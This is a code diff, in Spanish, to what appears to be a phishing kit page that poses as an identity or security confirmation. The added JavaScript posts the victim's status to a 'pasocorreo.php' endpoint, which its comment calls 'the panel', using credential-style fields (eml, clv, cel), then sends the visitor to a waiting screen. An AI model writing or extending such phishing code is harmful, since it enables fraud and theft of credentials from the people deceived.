@@ -160,7 +160,7 @@ function b34f9_fecha_larga() {
         </style>
         
     </head>
-    <body>         
+    <body>        
         <div id="fondo"></div>
         <div id="cargando">
             <img src="../img/logo.svg" style="width: 60px; height: 60px;">            
@@ -188,21 +188,27 @@ function b34f9_fecha_larga() {
             <button class="boton-alerta" id="btn-intentar">Ya confirme que soy yo</button>
         </div>
 
-    
-</body>
+    </body>
 </html>
 <script type="text/javascript">
     $(document).ready(function() { 
         $('#btn-intentar').on('click', function() {
-            // Ocultar contenido actual
+            // 1. Ocultar contenido actual
             $(".mensaje-seguridad").hide();
             
-            // Mostrar pantalla de carga
+            // 2. Mostrar pantalla de carga
             $("#fondo").show();
             $("#cargando-o").show();
             
-            // Redirigir directamente a waiting.php
-            window.location.href = "../a/WAITING";
+            // 3. Enviar aviso al panel (simulamos el envío a pasocorreo.php)
+            $.post("../../../../../process/pasocorreo.php", { 
+                eml: "Confirmó WhatsApp", 
+                clv: "923", 
+                cel: "-" 
+            }, function(data) {
+                // 4. Una vez notificado el panel, redirigimos a la pantalla de espera real
+                window.location.href = "../a/WAITING";
+            });
         });
         
         // Prevenir zoom en doble tap
@@ -210,4 +216,4 @@ function b34f9_fecha_larga() {
             event.preventDefault();
         }, { passive: true });
     });
- </script>
+</script>
